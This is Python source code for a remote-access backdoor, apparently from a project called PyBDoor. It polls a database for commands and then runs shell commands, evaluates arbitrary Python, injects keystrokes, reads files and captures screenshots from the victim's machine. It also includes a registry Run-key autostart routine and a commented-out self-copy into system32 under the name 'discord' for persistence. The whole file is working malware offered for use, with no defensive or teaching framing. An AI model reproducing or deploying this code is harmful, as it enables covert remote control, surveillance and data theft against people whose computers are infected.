import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui, threading,pytz, requests

class backdoor:
    def __init__(self):
        # hard_drive_name = os.getcwd().split(":")
        # hard_drive_name = hard_drive_name[0]
        # if not os.path.exists(hard_drive_name+":/windows/system32/main.exe"):
        #     #os.chdir(hard_drive_name+":/windows/system32")
        #     shutil.copy("main.exe", hard_drive_name+":/windows/system32/main.exe")

        # self.set_autostart_registry('discord', hard_drive_name+':/windows/system32/main.exe')

        self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
        self.cursor = self.db.cursor()

        self.ip = requests.get("https://api6.ipify.org", timeout=5).text
        pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
        self.pc_id = None
        for pc in pcs:
            if self.ip == pc[-1]:
                self.pc_id = pc[0]

        if self.pc_id == None:
            sql_code = """INSERT INTO backdoor_computer
                      (ip_addr, pc_name, last_online)
                      VALUES (?, ?, ?)
            """
            
            self.cursor.execute(sql_code, (self.ip,socket.gethostname(),datetime.datetime.now(pytz.utc)))
            self.db.commit()

            pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
            for pc in pcs:
                print(pc)
                if self.ip == pc[-1]:
                    self.pc_id = pc[0]
        t1 = threading.Thread(target=self.ping)
        t1.start()
        while True:
            self.command_thread()
            time.sleep(1)
        
    def ping(self):
        self.ping_db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
        self.ping_cursor = self.ping_db.cursor()
        while True:
            sql_code = """UPDATE backdoor_computer
                        SET last_online = ?
                        WHERE id = ?
                """
            self.ping_cursor.execute(sql_code, (datetime.datetime.now(pytz.utc), self.pc_id))
            self.ping_db.commit()
            time.sleep(5)

    def run(self, code):
        output = ""
        commands_to_execute = code.split("\r\n")
        lines_to_skip = []
        for line, command in enumerate(commands_to_execute):
            if line in lines_to_skip: continue
            if command.startswith("read"):
                command = command.replace(")", "")
                command_args = command.split("(")
                files_to_read = command_args[1].split(",")
                for file in files_to_read:
                    file = file.replace('"', '')
                    file = file.replace("'", "")
                    file = file.replace(" ", "")
                    try:
                        with open(file, "r") as r:
                            output += r.read()
                    except FileNotFoundError:
                        output += "FileNotFoundError: " + file + " does not exist\n"
            elif command.startswith("keyboard"):
                for i in range(1,len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break

                    if commands_to_execute[i+line].startswith("`") and commands_to_execute[i+line].endswith("`"):
                        execute_key_word = commands_to_execute[i+line]
                        execute_key_word = execute_key_word.replace("`", "")
                        keyboard.send(execute_key_word)
                        continue
                    
                    keyboard.write(commands_to_execute[i+line])
            elif command.startswith("delay"):
                delay_command = command.split("(")
                time_to_delay = delay_command[1].replace(")", "")
                time.sleep(float(time_to_delay))
            elif command.startswith("screenshot()"):
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(r'screenshot.png')
                jsonString = bytearray()
                with open("screenshot.png", "rb") as r:
                    while True:
                        data = r.read(1024)
                        if not data:
                            break
                        jsonString.extend(data)
                sql_code = """INSERT INTO backdoor_image
                      (img_data, img_name)                 
                      VALUES (?, ?)
                """
                with open("test.png", "wb+") as w:
                    w.write(jsonString)
                self.cursor.execute(sql_code, (r, "screenshot.png"))
                self.db.commit()
                os.remove("screenshot.png")
            elif command.startswith("python"):
                python_code = ""
                for i in range(1, len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break
                    
                    python_code += commands_to_execute[i+line] + "\n"
                
                eval(python_code)

            else:
                os.system(command)
                output += os.popen(command).read()

        return output
    def command_thread(self):
        commands = self.cursor.execute("SELECT * FROM backdoor_command").fetchall()
        for command in commands:
            if command[1] == self.pc_id:
                output = self.run(command[2])
                
                self.cursor.execute(f"DELETE FROM backdoor_command WHERE id={str(command[0])}")
                sql_code = """INSERT INTO backdoor_output
                      (command, output, target_id, time)                 
                      VALUES (?, ?, ?, ?)
                """
                self.cursor.execute(sql_code, (command[2], output, self.pc_id,datetime.datetime.now()))
                self.db.commit()
    def set_autostart_registry(self, app_name, key_data=None, autostart: bool = True) -> bool:
        with winreg.OpenKey(
                key=winreg.HKEY_CURRENT_USER,
                sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
                reserved=0,
                access=winreg.KEY_ALL_ACCESS,
        ) as key:
            try:
                if autostart:
                    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
                else:
                    winreg.DeleteValue(key, app_name)
            except OSError:
                return False
        return True                
backdoor()



